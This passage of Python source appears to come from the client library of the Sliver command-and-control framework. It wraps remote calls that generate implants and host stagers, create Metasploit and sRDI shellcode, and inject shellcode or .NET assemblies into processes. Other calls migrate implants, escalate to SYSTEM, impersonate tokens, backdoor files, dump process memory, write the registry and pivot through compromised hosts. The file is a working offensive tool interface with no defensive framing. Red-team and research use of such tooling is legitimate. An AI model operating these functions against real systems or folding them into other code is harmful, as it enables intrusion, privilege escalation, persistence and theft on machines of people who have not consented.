    async def start_http_stager_listener(self, host: str, port: int, data: bytes, cert: bytes, key: bytes, acme: bool, timeout=TIMEOUT) -> client_pb2.StagerListener:
        '''Start an HTTP(S) stager listener

        :param host: Host interface to bind the listener to, an empty string will bind to all interfaces
        :type host: str
        :param port: TCP port number to start listener on
        :type port: int
        :param data: Binary data of stage to host on listener
        :type data: bytes
        :param cert: TLS certificate, leave blank to start listener as HTTP
        :type cert: bytes
        :param key: TLS key, leave blank to start listener as HTTP
        :type key: bytes
        :param acme: Automatically provision TLS certificate using ACME (i.e., Let's Encrypt)
        :type acme: bool
        :param timeout: gRPC timeout, defaults to 60 seconds
        :type timeout: int, optional
        :return: Protobuf StagerListener object
        :rtype: client_pb2.StagerListener
        '''        
        stage = client_pb2.StagerListenerReq()
        if key or acme:
            stage.Protocol = client_pb2.HTTPS
        else:
            stage.Protocol = client_pb2.HTTP
        stage.Host = host
        stage.Port = port
        stage.Data = data
        stage.Cert = cert
        stage.Key = key
        stage.ACME = acme
        return (await self._stub.StartHTTPStagerListener(stage, timeout=timeout))

    async def generate(self, config: client_pb2.ImplantConfig, timeout: int = 360) -> client_pb2.Generate:
        '''Generate a new implant using a given configuration

        :param config: Protobuf ImplantConfig object
        :type config: client_pb2.ImplantConfig
        :param timeout: gRPC timeout, defaults to 360
        :type timeout: int, optional
        :return: Protobuf Generate object containing the generated implant
        :rtype: client_pb2.Generate
        '''        
        req = client_pb2.GenerateReq()
        req.ImplantConfig = config
        return (await self._stub.Generate(req, timeout=timeout))

    async def regenerate(self, implant_name: str, timeout=TIMEOUT) -> client_pb2.Generate:
        '''Regenerate an implant binary given the implants "name"

        :param implant_name: The name of the implant to regenerate
        :type implant_name: str
        :param timeout: gRPC timeout, defaults to 60 seconds
        :type timeout: int, optional
        :return: Protobuf Generate object
        :rtype: client_pb2.Generate
        '''
        regenerate = client_pb2.RegenerateReq()
        regenerate.ImpantName = implant_name
        return (await self._stub.Regenerate(regenerate, timeout=timeout))

    async def implant_builds(self, timeout=TIMEOUT) -> Dict[str, client_pb2.ImplantConfig]:
        '''Get information about historical implant builds

        :return: Protobuf Map object, the keys are implant names the values are implant configs
        :rtype: Dict[str, client_pb2.ImplantConfig]
        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        '''
        builds: client_pb2.ImplantBuilds = await self._stub.ImplantBuilds(common_pb2.Empty(), timeout=timeout)
        return builds.Configs

    async def delete_implant_build(self, implant_name: str, timeout=TIMEOUT) -> None:
        '''Delete a historical implant build from the server by name

        :param implant_name: The name of the implant build to delete
        :type implant_name: str
        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        '''  
        delete = client_pb2.DeleteReq()
        delete.Name = implant_name
        await self._stub.DeleteImplantBuild(delete, timeout=timeout)
    
    async def canaries(self, timeout=TIMEOUT) -> List[client_pb2.DNSCanary]:
        '''Get a list of canaries that have been generated during implant builds, includes metadata about those canaries

        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        :return: List of Protobuf DNSCanary objects
        :rtype: List[client_pb2.DNSCanary]
        '''  
        canaries = await self._stub.Canaries(common_pb2.Empty(), timeout=timeout)
        return list(canaries.Canaries)
    
    async def generate_wg_client_config(self, timeout=TIMEOUT) -> client_pb2.WGClientConfig:
        '''Generate a new WireGuard client configuration files

        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        :return: Protobuf WGClientConfig object
        :rtype: client_pb2.WGClientConfig
        '''
        return (await self._stub.GenerateWGClientConfig(common_pb2.Empty(), timeout=timeout))

    async def generate_unique_ip(self, timeout=TIMEOUT) -> client_pb2.UniqueWGIP:
        '''Generate a unique IP address for use with WireGuard

        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        :return: Protobuf UniqueWGIP object
        :rtype: client_pb2.UniqueWGIP
        ''' 
        return (await self._stub.GenerateUniqueIP(common_pb2.Empty(), timeout=timeout))
    
    async def implant_profiles(self, timeout=TIMEOUT) -> List[client_pb2.ImplantProfile]:
        '''Get a list of all implant configuration profiles on the server

        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        :return: List of Protobuf ImplantProfile objects
        :rtype: List[client_pb2.ImplantProfile]
        '''
        profiles = await self._stub.ImplantProfiles(common_pb2.Empty(), timeout=timeout)
        return list(profiles.Profiles)
    
    async def delete_implant_profile(self, profile_name, timeout=TIMEOUT) -> None:
        '''Delete an implant configuration profile by name

        :param profile_name: Name of the profile to delete
        :type profile_name: str
        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        ''' 
        delete = client_pb2.DeleteReq()
        delete.Name = profile_name
        await self._stub.DeleteImplantProfile(delete, timeout=timeout)
    
    async def save_implant_profile(self, profile: client_pb2.ImplantProfile, timeout=TIMEOUT) -> client_pb2.ImplantProfile:
        '''Save an implant configuration profile to the server

        :param profile: An implant configuration profile (a Protobuf ImplantProfile object)
        :type profile: client_pb2.ImplantProfile
        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        :return: Protobuf ImplantProfile object
        :rtype: client_pb2.ImplantProfile
        ''' 
        return (await self._stub.SaveImplantProfile(profile, timeout=timeout))
    
    async def msf_stage(self, arch: str, format: str, host: str, port: int, os: str, protocol: client_pb2.StageProtocol, badchars=[], timeout=TIMEOUT) -> client_pb2.MsfStager:
        '''Create a Metasploit (if available on the server) stager

        :param arch: CPU architecture
        :type arch: str
        :param format: Binary format (MSF)
        :type format: str
        :param host: LHOST (MSF)
        :type host: str
        :param port: LPORT (MSF)
        :type port: int
        :param os: Operating System (MSF)
        :type os: str
        :param protocol: Starger protocol (Protobuf StageProtocol object)
        :type protocol: client_pb2.StageProtocol
        :param badchars: Bad characters, defaults to []
        :type badchars: list, optional
        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        :return: Protobuf MsfStager object
        :rtype: client_pb2.MsfStager
        '''
        stagerReq = client_pb2.MsfStagerReq()
        stagerReq.Arch = arch
        stagerReq.Format = format
        stagerReq.Port = port
        stagerReq.Host = host
        stagerReq.OS = os
        stagerReq.Protocol = protocol
        stagerReq.BadChars = badchars
        return (await self._stub.MsfStage(stagerReq, timeout=timeout))

    async def shellcode_rdi(self, data: bytes, function_name: str, arguments: str, timeout=TIMEOUT) -> client_pb2.ShellcodeRDI:
        '''Generate sRDI shellcode

        :param data: The DLL file to wrap in an sRDI shellcode loader
        :type data: bytes
        :param function_name: Function to call on the DLL
        :type function_name: str
        :param arguments: Arguments to the function called
        :type arguments: str
        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        :return: Protobuf ShellcodeRDI object
        :rtype: client_pb2.ShellcodeRDI
        '''
        shellReq = client_pb2.ShellcodeRDIReq()
        shellReq.Data = data
        shellReq.FunctionName = function_name
        shellReq.Arguments = arguments
        return (await self._stub.ShellcodeRDI(shellReq, timeout=timeout))
    
    async def websites(self, timeout=TIMEOUT) -> List[client_pb2.Website]:
        '''Get a list of websites

        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        :return: List of Protobuf Website objects
        :rtype: List[client_pb2.Website]
        '''        
        websites = await self._stub.Websites(common_pb2.Empty(), timeout=timeout)
        return list(websites.Websites)
    
    async def website(self, website: client_pb2.Website, timeout=TIMEOUT) -> client_pb2.Website:
        '''Update an entire website object on the server

        :param website: The updated Protobuf Website object
        :type website: client_pb2.Website
        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        :return: Protobuf Website object
        :rtype: client_pb2.Website
        '''        
        return (await self._stub.Websites(website, timeout=timeout))

    async def website_remove(self, name: str, timeout=TIMEOUT) -> None:
        '''Remove an entire website and its content

        :param name: The name of the website to remove
        :type name: str
        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        '''
        website = client_pb2.Website()
        website.Name = name
        await self._stub.Websites(website, timeout=timeout)

    async def website_add_content(self, name: str, web_path: str, content_type: str, content: bytes, timeout=TIMEOUT) -> client_pb2.Website:
        '''Add content to a specific website

        :param name: Name of the website to add the content to
        :type name: str
        :param web_path: Bind content to web path
        :type web_path: str
        :param content_type: Specify the Content-type response HTTP header
        :type content_type: str
        :param content: The raw response content
        :type content: bytes
        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        :return: Protobuf Website object
        :rtype: client_pb2.Website
        '''        
        web = client_pb2.WebContent()
        web.Path = web_path
        web.ContentType = content_type
        web.Content = content
        web.Size = len(content)
        add = client_pb2.WebsiteAddContent()
        add.Name = name
        add.Content[web_path] = web
        return (await self._stub.WebsiteAddContent(add, timeout=timeout))

    async def website_update_content(self, name: str, web_path: str, content_type: str, content: bytes, timeout=TIMEOUT) -> client_pb2.Website:
        '''Update content on a specific website / web path

        :param name: Name of the website to add the content to
        :type name: str
        :param web_path: Bind content to web path
        :type web_path: str
        :param content_type: Specify the Content-type response HTTP header
        :type content_type: str
        :param content: The raw response content
        :type content: bytes
        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        :return: Protobuf Website object
        :rtype: client_pb2.Website
        '''        
        web = client_pb2.WebContent()
        web.Path = web_path
        web.ContentType = content_type
        web.Content = content
        web.Size = len(content)
        add = client_pb2.WebsiteAddContent()
        add.Name = name
        add.Content[web_path] = web
        return (await self._stub.WebsiteUpdateContent(add, timeout=timeout))

    async def website_rm_content(self, name: str, paths: List[str], timeout=TIMEOUT) -> client_pb2.Website:
        '''Remove content from a specific website

        :param name: The name of the website from which to remove the content
        :type name: str
        :param paths: A list of paths to content that should be removed from the website
        :type paths: List[str]
        :param timeout: gRPC timeout, defaults to TIMEOUT
        :type timeout: int, optional
        :return: Protobuf Website object
        :rtype: client_pb2.Website
        '''        
        web = client_pb2.WebsiteRemoveContent()
        web.Name = name
        web.Paths.extend(paths)
        return (await self._stub.WebsiteRemoveContent(web, timeout=timeout))
    

class InteractiveSession(BaseSession):

    def ping(self) -> sliver_pb2.Ping:
        '''Send a round trip message to the implant (does NOT use ICMP)

        :return: Protobuf ping object
        :rtype: sliver_pb2.Ping
        '''    
        ping = sliver_pb2.Ping()
        ping.Request = self._request()
        return self._stub.Ping(ping, timeout=self.timeout)

    def ps(self) -> sliver_pb2.Ps:
        '''List the processes of the remote system

        :return: Ps protobuf object
        :rtype: sliver_pb2.Ps
        '''   
        ps = sliver_pb2.PsReq()
        return self._stub.Ps(self._request(ps), timeout=self.timeout)
    
    def terminate(self, pid: int, force=False) -> sliver_pb2.Terminate:
        '''Terminate a remote process

        :param pid: The process ID to terminate.
        :type pid: int
        :param force: Force termination of the process, defaults to False
        :type force: bool, optional
        :return: Protobuf terminate object
        :rtype: sliver_pb2.Terminate
        '''
        terminator = sliver_pb2.TerminateReq()
        terminator.Pid = pid
        terminator.Force = force
        return self._stub.Terminate(self._request(terminator), timeout=self.timeout)

    def ifconfig(self) -> sliver_pb2.Ifconfig:
        '''Get network interface configuration information about the remote system

        :return: Protobuf ifconfig object
        :rtype: sliver_pb2.Ifconfig
        '''
        return self._stub.Ifconfig(self._request(sliver_pb2.IfconfigReq(), timeout=self.timeout))
    
    def netstat(self, tcp: bool, udp: bool, ipv4: bool, ipv6: bool, listening=True) -> List[sliver_pb2.SockTabEntry]:
        '''Get information about network connections on the remote system.

        :param tcp: Get TCP information
        :type tcp: bool
        :param udp: Get UDP information
        :type udp: bool
        :param ipv4: Get IPv4 connection information
        :type ipv4: bool
        :param ipv6: Get IPv6 connection information
        :type ipv6: bool
        :param listening: Get listening connection information, defaults to True
        :type listening: bool, optional
        :return: Protobuf netstat object
        :rtype: List[sliver_pb2.SockTabEntry]
        '''
        net = sliver_pb2.NetstatReq()
        net.TCP = tcp
        net.UDP = udp
        net.IP4 = ipv4
        net.IP6 = ipv6
        net.Listening = listening
        stat = self._stub.Netstat(self._request(net), timeout=self.timeout)
        return list(stat.Entries)
    
    def ls(self, remote_path: str = '.') -> sliver_pb2.Ls:
        '''Get a directory listing from the remote system

        :param remote_path: Remote path
        :type remote_path: str
        :return: Protobuf ls object
        :rtype: sliver_pb2.Ls
        ''' 
        ls = sliver_pb2.LsReq()
        ls.Path = remote_path
        return self._stub.Ls(self._request(ls), timeout=self.timeout)

    def cd(self, remote_path: str) -> sliver_pb2.Pwd:
        '''Change the current working directory of the implant

        :param remote_path: Remote path
        :type remote_path: str
        :return: Protobuf pwd object
        :rtype: sliver_pb2.Pwd
        '''
        cd = sliver_pb2.CdReq()
        cd.Path = remote_path
        return self._stub.Cd(self._request(cd), timeout=self.timeout)

    def pwd(self) -> sliver_pb2.Pwd:
        '''Get the implant's current working directory

        :return: Protobuf pwd object
        :rtype: sliver_pb2.Pwd
        '''
        pwd = sliver_pb2.PwdReq()
        return self._stub.Pwd(self._request(pwd), timeout=self.timeout)

    def rm(self, remote_path: str, recursive=False, force=False) -> sliver_pb2.Rm:
        '''Remove a directory or file(s)

        :param remote_path: Remote path
        :type remote_path: str
        :param recursive: Recursively remove file(s), defaults to False
        :type recursive: bool, optional
        :param force: Forcefully remove the file(s), defaults to False
        :type force: bool, optional
        :return: Protobuf rm object
        :rtype: sliver_pb2.Rm
        '''
        rm = sliver_pb2.RmReq()
        rm.Path = remote_path
        rm.Recursive = recursive
        rm.Force = force
        return self._stub.Rm(self._request(rm), timeout=self.timeout)

    def mkdir(self, remote_path: str) -> sliver_pb2.Mkdir:
        '''Make a directory on the remote file system

        :param remote_path: Directory to create
        :type remote_path: str
        :return: Protobuf Mkdir object
        :rtype: sliver_pb2.Mkdir
        '''  
        make = sliver_pb2.MkdirReq()
        make.Path = remote_path
        return self._stub.Mkdir(self._request(make), timeout=self.timeout)

    def download(self, remote_path: str) -> sliver_pb2.Download:
        '''Download a file from the remote file system

        :param remote_path: File to download
        :type remote_path: str
        :return: Protobuf Download object
        :rtype: sliver_pb2.Download
        '''  
        download = sliver_pb2.DownloadReq()
        download.Path = remote_path
        return self._stub.Download(self._request(download), timeout=self.timeout)

    def upload(self, remote_path: str, data: bytes, encoder='') -> sliver_pb2.Upload:
        '''Write data to specified path on remote file system 

        :param remote_path: Remote path
        :type remote_path: str
        :param data: Data to write
        :type data: bytes
        :param encoder: Data encoder ('', 'gzip'), defaults to ''
        :type encoder: str, optional
        :return: Protobuf Upload object
        :rtype: sliver_pb2.Upload
        ''' 
        upload = sliver_pb2.UploadReq()
        upload.Path = remote_path
        upload.Data = data
        upload.Encoder = encoder
        return self._stub.Upload(self._request(upload), timeout=self.timeout)

    def process_dump(self, pid: int) -> sliver_pb2.ProcessDump:
        '''Dump a remote process' memory

        :param pid: PID of the process to dump
        :type pid: int
        :return: Protobuf ProcessDump object
        :rtype: sliver_pb2.ProcessDump
        ''' 
        procdump = sliver_pb2.ProcessDumpReq()
        procdump.Pid = pid
        return self._stub.ProcessDump(self._request(procdump), timeout=self.timeout)

    def run_as(self, username: str, process_name: str, args: str) -> sliver_pb2.RunAs:
        '''Run a command as another user on the remote system

        :param username: User to run process as
        :type username: str
        :param process_name: Process to execute
        :type process_name: str
        :param args: Arguments to process
        :type args: str
        :return: Protobuf RunAs object
        :rtype: sliver_pb2.RunAs
        '''  
        run_as = sliver_pb2.RunAsReq()
        run_as.Username = username
        run_as.ProcessName = process_name
        run_as.Args.extend(args)
        return self._stub.RunAs(self._request(run_as), timeout=self.timeout)

    def impersonate(self, username: str) -> sliver_pb2.Impersonate:
        '''Impersonate a user using tokens (Windows only)

        :param username: User to impersonate
        :type username: str
        :return: Protobuf Impersonate object
        :rtype: sliver_pb2.Impersonate
        '''    
        impersonate = sliver_pb2.ImpersonateReq()
        impersonate.Username = username
        return self._stub.Impersonate(self._request(impersonate), timeout=self.timeout)
    
    def revert_to_self(self) -> sliver_pb2.RevToSelf:
        '''Revert to self from impersonation context

        :return: Protobuf RevToSelf object
        :rtype: sliver_pb2.RevToSelf
        ''' 
        return self._stub.RevToSelf(self._request(sliver_pb2.RevToSelfReq()), timeout=self.timeout)
    
    def get_system(self, hosting_process: str, config: client_pb2.ImplantConfig) -> sliver_pb2.GetSystem:
        '''Attempt to get SYSTEM (Windows only)

        :param hosting_process: Hosting process to attempt gaining privileges
        :type hosting_process: str
        :param config: Implant configuration to be injected into the hosting process
        :type config: client_pb2.ImplantConfig
        :return: Protobuf GetSystem object
        :rtype: sliver_pb2.GetSystem
        ''' 
        system = client_pb2.GetSystemReq()
        system.HostingProcess = hosting_process
        system.Config = config
        return self._stub.GetSystem(self._request(system), timeout=self.timeout)
    
    def execute_shellcode(self, data: bytes, rwx: bool, pid: int, encoder='') -> sliver_pb2.Task:
        '''Execute shellcode in-memory

        :param data: Shellcode buffer
        :type data: bytes
        :param rwx: Enable/disable RWX pages
        :type rwx: bool
        :param pid: Process ID to inject shellcode into
        :type pid: int
        :param encoder: Encoder ('', 'gzip'), defaults to ''
        :type encoder: str, optional
        :return: Protobuf Task object
        :rtype: sliver_pb2.Task
        ''' 
        return self.task(data, rwx, pid, encoder)

    def task(self, data: bytes, rwx: bool, pid: int, encoder='') -> sliver_pb2.Task:
        '''Execute shellcode in-memory ("Task" is a synonym for shellcode)

        :param data: Shellcode buffer
        :type data: bytes
        :param rwx: Enable/disable RWX pages
        :type rwx: bool
        :param pid: Process ID to inject shellcode into
        :type pid: int
        :param encoder: Encoder ('', 'gzip'), defaults to ''
        :type encoder: str, optional
        :return: Protobuf Task object
        :rtype: sliver_pb2.Task
        '''     
        task = sliver_pb2.TaskReq()
        task.Encoder = encoder
        task.RWXPages = rwx
        task.Pid = pid
        task.Data = data
        return self._stub.Task(self._request(task), timeout=self.timeout)
    
    def msf(self, payload: str, lhost: str, lport: int, encoder: str, iterations: int) -> None:
        '''Execute Metasploit payload on remote system, the payload will be generated by the server
        based on the parameters to this function. The server must be configured with Metasploit.

        :param payload: Payload to generate
        :type payload: str
        :param lhost: Metasploit LHOST parameter
        :type lhost: str
        :param lport: Metasploit LPORT parameter
        :type lport: int
        :param encoder: Metasploit encoder
        :type encoder: str
        :param iterations: Iterations for Metasploit encoder
        :type iterations: int
        '''
        msf = client_pb2.MSFReq()
        msf.Payload = payload
        msf.LHost = lhost
        msf.LPort = lport
        msf.Encoder = encoder
        msf.Iterations = iterations
        return self._stub.Msf(self._request(msf), timeout=self.timeout)

    def msf_remote(self, payload: str, lhost: str, lport: int, encoder: str, iterations: int, pid: int) -> None:
        '''Execute Metasploit payload in a remote process, the payload will be generated by the server
        based on the parameters to this function. The server must be configured with Metasploit.

        :param payload: Payload to generate
        :type payload: str
        :param lhost: Metasploit LHOST parameter
        :type lhost: str
        :param lport: Metasploit LPORT parameter
        :type lport: int
        :param encoder: Metasploit encoder
        :type encoder: str
        :param iterations: Iterations for Metasploit encoder
        :type iterations: int
        :param pid: Process ID to inject the payload into
        :type pid: int
        ''' 
        msf = client_pb2.MSFRemoteReq()
        msf.Payload = payload
        msf.LHost = lhost
        msf.LPort = lport
        msf.Encoder = encoder
        msf.Iterations = iterations
        msf.PID = pid
        return self._stub.Msf(self._request(msf), timeout=self.timeout)
    
    def execute_assembly(self, assembly: bytes, arguments: str, process: str, is_dll: bool, arch: str, class_name: str, method: str, app_domain: str) -> sliver_pb2.ExecuteAssembly:
        '''Execute a .NET assembly in-memory on the remote system

        :param assembly: A buffer of the .NET assembly to execute
        :type assembly: bytes
        :param arguments: Arguments to the .NET assembly
        :type arguments: str
        :param process: Process to execute assembly
        :type process: str
        :param is_dll: Is assembly a DLL
        :type is_dll: bool
        :param arch: Assembly architecture
        :type arch: str
        :param class_name: Class name of the assembly
        :type class_name: str
        :param method: Method to execute
        :type method: str
        :param app_domain: AppDomain
        :type app_domain: str
        :return: Protobuf ExecuteAssembly object
        :rtype: sliver_pb2.ExecuteAssembly
        '''
        asm = sliver_pb2.ExecuteAssemblyReq()
        asm.Assembly = assembly
        asm.Arguments = arguments
        asm.Process = process
        asm.IsDLL = is_dll
        asm.Arch = arch
        asm.ClassName = class_name
        asm.AppDomain = app_domain
        return self._stub.ExecuteAssembly(self._request(asm), timeout=self.timeout)
    
    def migrate(self, pid: int, config: client_pb2.ImplantConfig) -> sliver_pb2.Migrate:
        '''Migrate implant to another process

        :param pid: Proccess ID to inject implant into
        :type pid: int
        :param config: Implant configuration to inject into the remote process
        :type config: client_pb2.ImplantConfig
        :return: Protobuf Migrate object
        :rtype: sliver_pb2.Migrate
        '''   
        migrate = client_pb2.MigrateReq()
        migrate.Pid = pid
        migrate.Config = config
        return self._stub.Migrate(self._request(migrate), timeout=self.timeout)

    def execute(self, exe: str, args: List[str], output: bool) -> sliver_pb2.Execute:
        '''Execute a command/subprocess on the remote system

        :param exe: Command/subprocess to execute
        :type exe: str
        :param args: Arguments to the command/subprocess
        :type args: List[str]
        :param output: Enable capturing command/subprocess stdout
        :type output: bool
        :return: Protobuf Execute object
        :rtype: sliver_pb2.Execute
        '''
        exec = sliver_pb2.ExecuteReq()
        exec.Path = exe
        exec.Args.extend(args)
        exec.Output = output
        return self._stub.Execute(self._request(exec), timeout=self.timeout)
    
    def execute_token(self, exe: str, args: List[str], output: bool) -> sliver_pb2.Execute:
        '''Execute a comman/subprocess on the remote system in the context of the current user token

        :param exe: Command/subprocess to execute
        :type exe: str
        :param args: Arguments to the command/subprocess
        :type args: List[str]
        :param output: Enable capturing command/subprocess stdout
        :type output: bool
        :return: Protobuf Execute object
        :rtype: sliver_pb2.Execute
        ''' 
        execToken = sliver_pb2.ExecuteTokenReq()
        execToken.Path = exe
        execToken.Args.extend(args)
        execToken.Output = output
        return self._stub.ExecuteToken(self._request(execToken), timeout=self.timeout)
    
    def sideload(self, data: bytes, process_name: str, arguments: str, entry_point: str, kill: bool) -> sliver_pb2.Sideload:
        side = sliver_pb2.SideloadReq()
        side.Data = data
        side.ProcessName = process_name
        side.Args = arguments
        side.EntryPoint = entry_point
        side.Kill = kill
        return self._stub.Sideload(self._request(side), timeout=self.timeout)
    
    def spawn_dll(self, data: bytes, process_name: str, arguments: str, entry_point: str, kill: bool) -> sliver_pb2.SpawnDll:
        spawn = sliver_pb2.InvokeSpawnDllReq()
        spawn.Data = data
        spawn.ProcessName = process_name
        spawn.Args = arguments
        spawn.EntryPoint = entry_point
        spawn.Kill = kill
        return self._stub.SpawnDll(self._request(spawn), timeout=self.timeout)
    
    def screenshot(self) -> sliver_pb2.Screenshot:
        return self._stub.Screenshot(self._request(sliver_pb2.ScreenshotReq()), timeout=self.timeout)
    
    def named_pipes(self, pipe_name: str) -> sliver_pb2.NamedPipes:
        pipe = sliver_pb2.NamedPipesReq()
        pipe.PipeName = pipe_name
        return self._stub.NamedPipes(self._request(pipe), timeout=self.timeout)

    def tcp_pivot_listener(self, address: str) -> sliver_pb2.TCPPivot:
        pivot = sliver_pb2.TCPPivotReq()
        pivot.Address = address
        return self._stub.TCPListener(self._request(pivot), timeout=self.timeout)
    
    def pivots(self) -> List[sliver_pb2.PivotEntry]:
        pivots = self._stub.ListPivots(self._request(sliver_pb2.PivotListReq()), timeout=self.timeout)
        return list(pivots.Entries)

    def start_service(self, name: str, description: str, exe: str, hostname: str, arguments: str) -> sliver_pb2.ServiceInfo:
        svc = sliver_pb2.StartServiceReq()
        svc.ServiceName = name
        svc.ServiceDescription = description
        svc.BinPath = exe
        svc.Hostname = hostname
        svc.Arguments = arguments
        return self._stub.StartService(self._request(svc), timeout=self.timeout)
    
    def stop_service(self, name: str, hostname: str) -> sliver_pb2.ServiceInfo:
        svc = sliver_pb2.StopServiceReq()
        svc.ServiceInfo.ServiceName = name
        svc.ServiceInfo.Hostname = hostname
        return self._stub.StopService(self._request(svc), timeout=self.timeout)

    def remove_service(self, name: str, hostname: str) -> sliver_pb2.ServiceInfo:
        svc = sliver_pb2.StopServiceReq()
        svc.ServiceInfo.ServiceName = name
        svc.ServiceInfo.Hostname = hostname
        return self._stub.RemoveService(self._request(svc), timeout=self.timeout)

    def make_token(self, username: str, password: str, domain: str) -> sliver_pb2.MakeToken:
        make = sliver_pb2.MakeTokenReq()
        make.Username = username
        make.Password = password
        make.Domain = domain
        return self._stub.MakeToken(self._request(make), timeout=self.timeout)

    def get_env(self, name: str) -> sliver_pb2.EnvInfo:
        env = sliver_pb2.EnvReq()
        env.Name = name
        return self._stub.GetEnv(self._request(env), timeout=self.timeout)
    
    def set_env(self, name: str, value: str) -> sliver_pb2.SetEnv:
        env = sliver_pb2.SetEnvReq()
        env.EnvVar.Key = name
        env.EnvVar.Value = value
        return self._stub.SetEnv(self._request(env), timeout=self.timeout)
    
    def backdoor(self, remote_path: str, profile_name: str) -> sliver_pb2.Backdoor:
        backdoor = sliver_pb2.BackdoorReq()
        backdoor.FilePath = remote_path
        backdoor.ProfileName = profile_name
        return self._stub.Backdoor(self._request(backdoor), timeout=self.timeout)
    
    def registry_read(self, hive: str, reg_path: str, key: str, hostname: str) -> sliver_pb2.RegistryRead:
        reg = sliver_pb2.RegistryReadReq()
        reg.Hive = hive
        reg.Path = reg_path
        reg.Key = key
        reg.Hostname = hostname
        return self._stub.RegistryRead(self._request(reg), timeout=self.timeout)

    def registry_write(self, hive: str, reg_path: str, key: str, hostname: str, string_value: str, byte_value: bytes, dword_value: int, qword_value: int, reg_type: sliver_pb2.RegistryType) -> sliver_pb2.RegistryWrite:
        reg = sliver_pb2.RegistryWriteReq()
        reg.Hive = hive
        reg.Path = reg_path
        reg.Key = key
        reg.Hostname = hostname
        reg.StringValue = string_value
        reg.ByteValue = byte_value
        reg.DWordValue = dword_value
        reg.QWordValue = qword_value
        reg.Type = reg_type
        return self._stub.RegistryWrite(self._request(reg), timeout=self.timeout)
    
    def registry_create_key(self, hive: str, reg_path: str, key: str, hostname: str) -> sliver_pb2.RegistryCreateKey:
        reg = sliver_pb2.RegistryCreateKey()
        reg.Hive = hive
        reg.Path = reg_path
        reg.Key = key
        reg.Hostname = hostname
        return self._stub.RegistryWrite(self._request(reg), timeout=self.timeout)


class SliverClient(BaseClient):

    '''
    Sliver Client implementation (synchronous/threading)
    '''

    # One lock for all of the callbacks, because I'm lazy, and it shouldn't matter
    _on_callback_lock = threading.Lock()
    _on_event: Dict[str, Callable] = {}

    session_event_types = ["session-connected", "session-disconnected"]
    _on_session: Dict[str, Callable] = {}

    job_event_types = ["job-started", "job-stopped"]
    _on_job: Dict[str, Callable] = {}

    canary_event_types = ["canary"]
    _on_canary: Dict[str, Callable] = {}

    #
    # > Helper Functions
    #
    def connect(self) -> client_pb2.Version:
        '''Establish a connection to the Sliver server

        :return: Protobuf Version object, containing the server's version information
        :rtype: client_pb2.Version
        '''
        self._executor = ThreadPoolExecutor()
        self._events_future = None
        self._event_iterator = None
        self._channel = grpc.secure_channel(
            target=self.target,
            credentials=self.credentials,
            options=self.options,
        )
        self._stub = SliverRPCStub(self._channel)
        return self.version()

    def interact(self, session_id: int, timeout=TIMEOUT) -> Union[InteractiveSession, None]:
        '''Interact with a session, returns an :class:`AsyncInteractiveSession`

        :param session_id: Numeric session ID
        :type session_id: int
        :param timeout: gRPC timeout, defaults to 60 seconds
        :return: An interactive session
        :rtype: Union[AsyncInteractiveSession, None]
        '''
        session = self.session_by_id(session_id, timeout)
        if session is not None:
            return InteractiveSession(session, self._channel)

    def session_by_id(self, session_id: int, timeout=TIMEOUT) -> Union[client_pb2.Session, None]:
        '''Get the session information from an numeric session ID.

        :param session_id: Numeric session ID
        :type session_id: int
        :param timeout: gRPC timeout, defaults to 60 seconds
        :return: Protobuf Session object
        :rtype: Union[client_pb2.Session, None]
        '''
        sessions = self.sessions(timeout)
        for session in sessions:
            if session.ID == session_id:
                return session
        return None

    def _fire_on_event(self, event):
        ''' Call "on_event" callbacks '''
        for _, callback in self._on_event.items():
            self._executor.submit(callback, event)
    
    def _fire_on_session(self, event):
        ''' Call "on_session" callbacks '''
        for _, callback in self._on_session.items():
            self._executor.submit(callback, event)
    
    def _fire_on_job(self, event):
        ''' Call "on_job" callbacks '''
        for _, callback in self._on_job.items():
            self._executor.submit(callback, event)
    
    def _fire_on_canary(self, event):
        ''' Call "on_canary" callbacks '''
        for _, callback in self._on_canary.items():
            self._executor.submit(callback, event)

    def _event_watcher(self, event_iterator: Iterator[client_pb2.Event]) -> None:
        ''' Iterates over streamed events until canceled, triggering registered callbacks '''
        try:
            for event in event_iterator:
                if hasattr(event, 'EventType'):
                    self._fire_on_event(event)
                    if event.EventType in self.session_event_types:
                        self._fire_on_session(event)
                    if event.EventType in self.job_event_types:
                        self._fire_on_job(event)
                    if event.EventType in self.canary_event_types:
                        self._fire_on_canary(event)
                else:
                    raise RuntimeError("Received Event without EventType")
        except grpc.RpcError as err:
            if err.code() == grpc.StatusCode.CANCELLED:
                return
            raise err
        except Exception as err:
            self._log.exception('Exception in thread pool (%s): %s', type(err), err)

    def _init_events(self) -> None:
        ''' Initializes the connection for streaming events using a thread pool '''
        empty = common_pb2.Empty()
        self._event_iterator = self._stub.Events(empty)
        self._events_future = self._executor.submit(self._event_watcher, self._event_iterator)

    def wait_for_events(self, timeout: Union[float, None] = None):
        ''' Wait for thread pool future '''
        self._events_future.result(timeout=timeout)
    
    def stop_events(self):
        ''' Stop the event iterator (should clean up all threads) '''
        if self._event_iterator is not None:
            self._event_iterator.cancel()
            self._event_iterator = None

    def on(self, event_type: str, callback: Callable) -> str:
        '''Register a callback for a specific event, the callback should accept one argument (the event object).

        :param event_type: The event type to trigger the callback
        :type event_type: str
        :param callback: The callback function, which should accept one argument
        :type callback: Callable
        :return: The callback ID, which can be used to unregister the callback
        :rtype: str
        '''        
        if self._events_future is None:
            self._init_events()
        callback_id = str(uuid4())

        def filtered_events(event: client_pb2.Event):
            if event.EventType == event_type:
                callback(event)

        self._on_event[callback_id] = filtered_events
        return callback_id

